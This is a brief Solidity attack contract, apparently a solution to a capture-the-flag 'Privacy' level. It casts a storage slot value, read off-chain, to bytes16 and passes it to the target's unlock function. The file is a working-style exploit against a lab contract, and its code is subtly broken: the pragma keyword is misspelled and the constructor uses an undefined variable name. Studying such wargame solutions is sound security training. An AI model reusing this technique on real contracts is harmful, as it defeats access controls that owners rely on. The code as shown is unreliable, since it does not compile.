prgama solidity ^0.5.0;

import './Privacy.sol';

// Good general knowledge 
// https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ 
contract PrivacyAttack {
    Privacy target;

    constructor(address _target) public {
        target = Privacy(_targetAddr);
    }

    function unlock(bytes32 _slotValue) public {
        // For more info on conversions like this 
        // https://docs.soliditylang.org/en/v0.8.14/types.html#explicit-conversions
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}
